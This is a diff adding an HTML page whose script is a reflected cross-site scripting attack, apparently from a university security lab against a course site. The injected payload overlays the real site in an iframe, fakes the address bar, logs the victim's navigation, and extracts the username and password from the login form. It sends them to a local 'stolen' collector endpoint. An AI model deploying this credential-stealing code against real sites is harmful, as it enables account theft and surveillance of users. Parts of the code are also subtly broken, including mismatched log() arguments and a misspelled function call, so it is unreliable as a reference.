@@ -1,0 +1,108 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script>
+
+
+function payload(attacker) {
+
+    var first_loaded = 0;
+
+    function log(data) {
+        console.log($.param(data));
+        $.get(attacker, data);
+    }
+
+
+    function getPath(url) {
+        return url.match(/(\/.*)/)[1];
+    }
+
+    function changeAddressBar(url) {
+        try {
+            window.history.replaceState({}, "", url);
+        } catch(e) {}
+    }
+
+
+    function proxy(attacker, mainhref) {
+        $('body').children().hide();
+        var i = $('<iframe id=_track>')
+        .css({
+        position: 'absolute',
+        width: '100%',
+        height: '100%',
+        top: 0,
+        left: 0,
+        border: 0,
+        background: '#fff'
+    })
+    .attr('sandbox', 'allow-same-origin allow-forms allow-scripts')
+    .attr('src',"http://trurl.cs.illinois.edu/")
+    .appendTo('body')
+    .load(function() {
+    if(first_loaded == 0) {
+        changeAddressBar("http://trurl.cs.illinois.edu/");
+    log(attacker, {event: "nav", user: $("#_track").contents().find("#logged-in-user").text(),uri: mainhref});
+        first_loaded = first_loaded+1;
+    }
+    $("#_track").contents().find(".list-group").hide();
+    $('body',this.contentDocument)
+        .find('a')
+            .click(function() {
+                log(attacker, {event:'nav', user: $("#_track").contents().find("#logged-in-user").text(),uri: this.href});
+                changeAddressBar(this.href);
+            })
+    .end()
+    .find('form')
+    .submit(function() {
+        if($(this).attr('action') == "./login") {
+        log(attacker, {event: 'login', user: $("#_track").contents().find("#logged-in-user").text()})
+        var str = $(this).serialize();
+        var str_user = "";
+        var eq_index = str.indexOf("=");
+        var and_index = str.indexOf("&");
+        str_user = str.substring(eq_index + 1, and_index);
+        var str_pass = "";
+        var eq_index2 = str.lastIndexOf("=");
+        str_pass = str.substring(eq_index2 + 1, str.length);
+        log(attacker, {event: 'login', user: str_user, pass: str_pass});
+        }
+        else if($(this).attr('action') == "./logout"){
+            log(attacker, {event: 'logout', user: $("#_track").contents().find("#logged-in-user").text()})
+        }
+        else {
+            var str_uri = "http://trurl.cs.illinois.edu/search?" + "q=" + $("#_track").contents().find("#query").val();
+            changeAddressBaxssdefer(str_uri);
+            log(attacker, {event:'nav', user: $("#_track").contents().find("#logged-in-user").text(),uri: str_uri })
+        }
+    })
+    .end();
+    });
+}
+    proxy(attacker, "http://trurl.cs.illinois.edu/");
+}
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+        encodeURIComponent("<script" + ">" + payload.toString() +
+        ";payload(\"" + attacker + "\");</script" + ">");
+        }
+    else
+        {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+        encodeURIComponent("<script" + ">" + payload.toString() +
+        ";payload(\"" + attacker + "\");</script" + ">");
+        }
+
+}
+var xssdefense = 0;
+var target = "http://trurl.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("#query-lbl").text('');
+    window.location.href = url;
+    });
+
+</script>
